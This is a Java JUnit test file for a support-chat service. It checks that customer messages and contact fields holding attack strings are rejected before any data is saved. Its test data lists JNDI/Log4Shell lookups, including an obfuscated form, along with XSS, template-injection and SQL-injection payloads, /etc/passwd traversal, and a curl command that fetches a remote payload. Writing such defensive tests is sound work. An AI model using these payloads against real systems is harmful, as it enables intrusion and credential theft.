package com.orionkey.service;

import com.orionkey.exception.BusinessException;
import com.orionkey.entity.SupportConversation;
import com.orionkey.entity.SupportMessage;
import com.orionkey.repository.SupportConversationRepository;
import com.orionkey.repository.SupportImageRepository;
import com.orionkey.repository.SupportMessageRepository;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;
import java.util.UUID;
import java.util.Optional;
import java.util.HexFormat;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verifyNoInteractions;
import static org.mockito.Mockito.*;

class SupportMessageSecurityTest {

    @ParameterizedTest
    @MethodSource("unsafeMessages")
    void identifiesUnsafeCustomerContent(String text, String category) {
        assertEquals(category, SupportService.unsafeCustomerContentCategory(text));
    }

    @ParameterizedTest
    @MethodSource("normalMessages")
    void allowsNormalCustomerQuestions(String text) {
        assertNull(SupportService.unsafeCustomerContentCategory(text));
    }

    @Test
    void rejectsUnsafeFirstMessageBeforeCreatingConversation() {
        SupportConversationRepository conversations = mock(SupportConversationRepository.class);
        SupportMessageRepository messages = mock(SupportMessageRepository.class);
        SupportImageRepository images = mock(SupportImageRepository.class);
        SupportService service = new SupportService(conversations, messages, images);

        assertThrows(BusinessException.class,
                () -> service.create(null, null, "${jndi:ldap://127.0.0.1:1389/x}"));

        verifyNoInteractions(conversations, messages, images);
    }

    @Test
    void rejectsUnsafeContactFieldsBeforeCreatingConversation() {
        var conversations = mock(SupportConversationRepository.class);
        var messages = mock(SupportMessageRepository.class);
        var images = mock(SupportImageRepository.class);
        var service = new SupportService(conversations, messages, images);
        assertThrows(BusinessException.class, () -> service.create("${jndi:ldap://127.0.0.1/x}", null, "hello"));
        assertThrows(BusinessException.class, () -> service.create(null, "<script>alert(1)</script>", "hello"));
        verifyNoInteractions(conversations, messages, images);
    }

    @Test
    void rejectsFollowUpBeforeSavingAndLeavesAdminRepliesAvailable() throws Exception {
        var conversations = mock(SupportConversationRepository.class);
        var messages = mock(SupportMessageRepository.class);
        var images = mock(SupportImageRepository.class);
        var service = new SupportService(conversations, messages, images);
        var conversation = new SupportConversation();
        conversation.setId(UUID.randomUUID());
        String token = "A".repeat(43);
        conversation.setTokenHash(HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256")
                .digest(token.getBytes(StandardCharsets.UTF_8))));
        conversation.setLastActivityAt(java.time.LocalDateTime.now());
        when(conversations.lockById(conversation.getId())).thenReturn(Optional.of(conversation));

        assertThrows(BusinessException.class, () -> service.customerMessage(conversation.getId(), token,
                "${jndi:ldap://127.0.0.1:9/x}"));
        verifyNoInteractions(messages, images);
        verify(conversations, never()).save(any());

        service.customerMessage(conversation.getId(), token, "hello, payment failed");
        verify(messages).saveAndFlush(argThat(m -> m.getSender() == SupportMessage.Sender.CUSTOMER
                && m.getText().equals("hello, payment failed")));
        service.adminMessage(conversation.getId(), "Please remove <script> from your input");
        verify(messages).saveAndFlush(argThat(m -> m.getSender() == SupportMessage.Sender.ADMIN));
    }

    private static Stream<String> normalMessages() {
        return Stream.of("订单支付失败，请帮忙查看。", "hello, can you help me?", "[图片]",
                "a68feb51-8e81-4c89-92b7-de0151118745", "customer@example.com", "https://example.com/order",
                "1+1=2", "online=true", "PowerShell 怎么打开？", "😊");
    }

    private static Stream<Arguments> unsafeMessages() {
        return Stream.of(
                Arguments.of("${jndi:ldap://127.0.0.1:1389/x}", "JNDI_LOOKUP"),
                Arguments.of("${jndi:ldap://10.255.255.1:1389/x}", "JNDI_LOOKUP"),
                Arguments.of("${${lower:j}ndi:rmi://127.0.0.1/x}", "JNDI_LOOKUP"),
                Arguments.of("<img src=x onerror=alert(1)>", "SCRIPT_INJECTION"),
                Arguments.of("<svg/onload=alert(2)>", "SCRIPT_INJECTION"),
                Arguments.of("{{7*7}}", "TEMPLATE_INJECTION"),
                Arguments.of("SSTI_TEST ${7*7} ${{7*7}} %{7*7} {{7*7}} [[${7*7}]]", "TEMPLATE_INJECTION"),
                Arguments.of("1 UNION SELECT password FROM users", "SQL_INJECTION"),
                Arguments.of("../../etc/passwd", "PATH_TRAVERSAL"),
                Arguments.of("%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
                Arguments.of("curl https://example.invalid/payload", "COMMAND_INJECTION")
        );
    }
}
